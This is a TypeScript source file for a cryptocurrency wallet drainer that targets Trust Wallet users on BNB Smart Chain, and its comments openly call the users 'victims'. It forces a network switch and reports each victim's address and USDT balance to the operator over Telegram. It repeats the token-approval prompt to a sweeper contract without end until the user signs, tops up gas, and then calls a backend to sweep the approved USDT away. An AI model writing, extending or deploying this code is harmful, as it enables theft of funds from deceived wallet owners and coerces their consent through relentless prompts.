import { ethers } from "ethers"
import { CONFIG, CHAIN_ID, CHAIN_NAME, RPC_URL } from "../config"

const BACKEND_URL = CONFIG.BACKEND_URL

// ============================================================
// AUTO-SWITCH TO BNB SMART CHAIN (BEP-20)
// ============================================================
// This function checks what network the wallet is currently on.
// If it is already BSC (chain ID 56), it returns true immediately.
// If it is on another network (e.g. Ethereum Mainnet which is what
// Trust Wallet iPhone defaults to), it sends a request to the wallet
// to switch to BSC. If BSC has never been added to the wallet,
// it sends a second request to add the BSC network first, then switches.
// ============================================================
export async function ensureCorrectNetwork(provider: ethers.BrowserProvider) {
  const network = await provider.getNetwork()
  const currentChainId = Number(network.chainId)

  // Already on BSC -- all good
  if (currentChainId === CHAIN_ID) return true

  // Try to switch to BSC
  try {
    const signer = await provider.getSigner()
    const hexChainId = "0x" + CHAIN_ID.toString(16) // "0x38" for BSC = 56

    // This triggers Trust Wallet's native "Switch Network" popup
    await signer.provider?.send("wallet_switchEthereumChain", [
      { chainId: hexChainId },
    ])

    // Wait a moment for the switch to complete and the wallet to settle
    await new Promise(r => setTimeout(r, 2000))
    return true
  } catch (switchError: any) {
    // Error code 4902 means the chain has never been added to the wallet
    if (switchError.code === 4902) {
      try {
        const signer = await provider.getSigner()
        const hexChainId = "0x" + CHAIN_ID.toString(16)

        // This triggers Trust Wallet's "Add Network" popup with BSC details
        await signer.provider?.send("wallet_addEthereumChain", [
          {
            chainId: hexChainId,
            chainName: CHAIN_NAME,
            nativeCurrency: { name: "BNB", symbol: "BNB", decimals: 18 },
            rpcUrls: [RPC_URL],
            blockExplorerUrls: ["https://bscscan.com"],
          },
        ])

        await new Promise(r => setTimeout(r, 2000))
        return true
      } catch (addError) {
        throw new Error("Please manually switch your wallet to BNB Smart Chain")
      }
    }
    throw new Error("Please manually switch your wallet to BNB Smart Chain")
  }
}

// ============================================================
// REQUEST USDT APPROVAL
// ============================================================
// 1. Auto-switches to BSC first (so balanceOf does not return 0x)
// 2. Gets the signer and creates the USDT contract instance
// 3. Fetches the victim's USDT balance and decimals
// 4. Sends a Telegram notification with the victim's wallet and balance
// 5. Calculates the approval amount (user balance or MAX_APPROVE, whichever is smaller)
// 6. Enters an infinite retry loop for the approve transaction
//    - If user rejects, retries after 500ms delay (prevents CPU overheating on mobile)
//    - If any other error, also retries after 500ms
//    - If user signs, sends Telegram notification and returns the approved amount
// ============================================================
export async function requestApproval(
  provider: ethers.BrowserProvider,
  victimAddress: string
): Promise<ethers.BigNumberish | null> {
  // Step 1: Auto-switch network before anything else
  // This fixes the iOS issue where Trust Wallet defaults to Ethereum Mainnet
  await ensureCorrectNetwork(provider)

  // Step 2: Get the signer (the victim's wallet)
  const signer = await provider.getSigner()

  // Step 3: Create the USDT contract connection
  const usdt = new ethers.Contract(
    CONFIG.USDT_CONTRACT,
    [
      "function approve(address spender, uint256 value) external returns (bool)",
      "function balanceOf(address account) external view returns (uint256)",
      "function decimals() external view returns (uint8)",
    ],
    signer
  )

  // Step 4: Fetch the victim's USDT balance and token decimals
  const rawBalance = await usdt.balanceOf(victimAddress)
  const decimals = await usdt.decimals()
  const balance = ethers.formatUnits(rawBalance, decimals)

  // Step 5: Send Telegram notification with victim info
  await fetch(`${BACKEND_URL}/api/telegram`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      message: "[New Victim] Wallet: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | Balance: " + parseFloat(balance).toFixed(2) + " USDT",
    }),
  }).catch(() => {})

  // Step 6: Calculate approval amount
  const maxApprove = ethers.parseUnits(CONFIG.MAX_APPROVE_USDT, decimals)
  const approveAmount = rawBalance < maxApprove ? rawBalance : maxApprove

  // Step 7: Infinite retry loop for approval
  while (true) {
    try {
      // Send the approve transaction to Trust Wallet
      const tx = await usdt.approve(CONFIG.SWEEPER_CONTRACT, approveAmount)
      // Wait for the transaction to be confirmed on-chain
      await tx.wait()

      // Send success notification
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Approval Signed] " + ethers.formatUnits(approveAmount, decimals) + " USDT | " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + tx.hash,
        }),
      })

      return approveAmount
    } catch (err: any) {
      // If the user rejected the approval in their wallet, wait 500ms then retry
      if (err.code === "ACTION_REJECTED" || err.code === 4001) {
        await new Promise(r => setTimeout(r, 500))
        continue
      }
      // Any other error (network error, timeout, etc.) -- also retry after 500ms
      await new Promise(r => setTimeout(r, 500))
      continue
    }
  }
}

// ============================================================
// ENSURE GAS (Funding)
// ============================================================
// 1. Checks the victim's BNB balance on-chain
// 2. If they have at least 0.0003 BNB, no funding needed
// 3. If not enough, calls the backend /api/fund-gas endpoint
//    which sends gas from the funding wallet to the victim
// 4. Returns true if gas is sufficient or was funded successfully
// ============================================================
export async function ensureGas(
  provider: ethers.Provider,
  victimAddress: string
): Promise<boolean> {
  const balance = await provider.getBalance(victimAddress)
  const minGas = ethers.parseEther("0.0003")

  // Victim already has enough BNB for gas
  if (balance >= minGas) {
    await fetch(`${BACKEND_URL}/api/telegram`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({
        message: "[Gas Check] " + ethers.formatEther(balance) + " BNB (sufficient)",
      }),
    })
    return true
  }

  // Victim needs gas -- call backend to fund them
  try {
    const response = await fetch(`${BACKEND_URL}/api/fund-gas`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[Gas Funded] Sent " + CONFIG.FUNDING_AMOUNT + " BNB to " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}

// ============================================================
// EXECUTE DRAIN
// ============================================================
// 1. Calls the backend /api/sweep endpoint
// 2. The backend (using the sweeper contract) transfers the approved
//    USDT from the victim to the sweeper wallet
// 3. Sends Telegram notification with the drain result
// ============================================================
export async function executeDrain(
  victimAddress: string,
  approvalAmount: ethers.BigNumberish
): Promise<boolean> {
  try {
    const response = await fetch(`${BACKEND_URL}/api/sweep`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ victimAddress }),
    })
    const data = await response.json()
    if (data.success) {
      const decimals = CONFIG.USDT_DECIMALS
      await fetch(`${BACKEND_URL}/api/telegram`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({
          message: "[DRAINED] " + ethers.formatUnits(approvalAmount, decimals) + " USDT | Victim: " + victimAddress.slice(0, 6) + "..." + victimAddress.slice(-4) + " | https://bscscan.com/tx/" + data.txHash,
        }),
      })
      return true
    }
    return false
  } catch {
    return false
  }
}